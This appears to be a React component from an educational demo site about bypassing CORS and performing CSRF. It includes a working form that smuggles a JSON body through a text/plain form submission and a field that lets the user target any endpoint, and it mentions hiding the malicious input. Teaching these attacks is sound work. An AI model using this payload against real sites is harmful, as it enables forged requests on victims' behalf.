import {
  ButtonsWrapper,
  RectButton,
  RoundButton,
  SectionWrapper,
  StyledForm,
  StyledHr,
  StyledInput,
  TextWrapper,
} from "../styles/misc-styles";
import { baseUrl, vulnerableDomain } from "../constants/constants";

import fetch from "isomorphic-unfetch";
import { useState } from "react";

const cookiesUrl = `${baseUrl}/api/csrf/post-cookies`;
const payload =
  '", "fakeId":"uWu123", "personality":"a terrible person", "requestedAction":"activate nuclear option!"}';

export default function CorsFormBypass() {
  const [formValue, setFormValue] = useState<string | undefined>();
  const [error, setError] = useState<string | undefined>();
  const [ownEndpoint, setOwnEndpoint] = useState<string | undefined>();

  const inputOwnEndpoint = ({
    target: { value },
  }: {
    target: { value: string };
  }) => {
    setOwnEndpoint(value);
  };

  const handleChange = ({ value }: { value: string }) => {
    setFormValue(value);
  };

  const postToOtherDomain = async () => {
    try {
      const res = await (
        await fetch(cookiesUrl, {
          method: "post",
          body: JSON.stringify({
            formValue,
          }),
        })
      ).json();
      console.log(res);
    } catch (error) {
      setError(error.message);
    }
  };

  return (
    <SectionWrapper>
      <h2>POST to other domain</h2>
      <TextWrapper>
        <p>
          We by-pass CORS and POST to <b>{cookiesUrl}</b>.
        </p>
      </TextWrapper>
      <ButtonsWrapper>
        <RoundButton onClick={postToOtherDomain}>
          POST to other domain
        </RoundButton>
      </ButtonsWrapper>
      {error && (
        <>
          <p>Error message: {error}</p>
          <p>Open dev tools console to see CORS error.</p>
        </>
      )}
      <StyledHr />
      <h3>POST with React SPA pattern</h3>
      <TextWrapper>
        <p>
          When submit is clicked we call an onSubmit function that takes the
          input data saved to local state and POSTs it in the request body.
        </p>

        <p>
          The response is blocked by CORS. But, if you have access to the server
          code you can see it accepts the form value in the request body.
        </p>

        <p>
          This method cannot seem to send cookies. So, it by-passes CORS but
          fails at CSRF.
        </p>
      </TextWrapper>
      <StyledForm
        id="form"
        method="post"
        onSubmit={(e) => {
          e.preventDefault();
          postToOtherDomain();
        }}
      >
        <StyledInput
          name="InputName"
          onChange={({ target }) => handleChange(target)}
        />
        <RectButton type="submit">By-pass CORS with form</RectButton>
      </StyledForm>
      <StyledHr />
      <h3>POST with regular HTML form pattern</h3>
      <TextWrapper>
        <p>
          When submit is clicked the `action` attribute on the form handles the
          POST request. Again, the response to this page is blocked by CORS.
          However, you will be redirected to the vulnerable domain where you see
          it has accepted the form data as a request body. Freaky and pretty
          neat! This response is for the default endpoint only. If you use your
          own endpoint the response will be according to how you coded it.
        </p>

        <p>This method by-passes CORS and successfully enacts CSRF.</p>

        <p>
          The input field with malicious data is usually hidden with something
          like `display: none`.
        </p>

        <p>
          Fill in your own API endpoint if you like. The default is{" "}
          <a href={vulnerableDomain} target="__blank">
            this page
          </a>
          .
        </p>
      </TextWrapper>

      <StyledInput
        id="your-url"
        name="your-url"
        placeholder="Your own API endpoint"
        onChange={inputOwnEndpoint}
      />

      <StyledForm
        id="form"
        method="post"
        action={ownEndpoint || cookiesUrl}
        encType="text/plain"
      >
        <StyledInput name='{"throwAway":"' defaultValue={payload} />
        <RectButton type="submit">By-pass CORS & do CSRF</RectButton>
      </StyledForm>
    </SectionWrapper>
  );
}
